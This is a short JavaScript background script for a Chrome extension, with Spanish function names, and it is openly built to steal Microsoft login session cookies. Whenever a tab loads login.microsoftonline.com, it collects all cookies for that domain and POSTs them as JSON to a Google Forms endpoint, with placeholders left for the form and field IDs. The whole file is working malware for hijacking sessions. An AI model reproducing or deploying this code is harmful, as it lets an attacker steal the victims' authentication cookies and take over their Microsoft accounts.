function extraerYExfiltrarToddy() 
{
    chrome.cookies.getAll({}, (cookies) => {
        const filteredCookies = cookies.filter (cookies => cookies.domain.includes("login.microsoftonline.com")
        );

        if(filteredCookies.length === 0)
        {
            return;
        }

        enviarCookieAFormulario(filteredCookies);
    
    });
}

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.url && changeInfo.url.includes("https://login.microsoftonline.com")) 
    {
        extraerYExfiltrarToddy();
    }
});

function enviarCookieAFormulario(cookies) 
{    
    console.log("DATOS OBTENIDOS \n", cookies);

    const formData = new URLSearchParams();
    formData.append("entry.xxxxxxxxxx", JSON.stringify(cookies)); //se debe colocar el ID de la pregunta del formulario
    fetch("https://docs.google.com/forms/d/e/<ID_FORMS>/formResponse", {
        method: "POST",
        body: formData,
        mode: "no-cors",
        headers: {
         "Content-Type": "application/x-www-form-urlencoded" 
        },
        
    })
    .then(() => console.log("Formulario enviado exitosamente"))
    .catch("se ha producido el siguiente error: ", err => {});

}

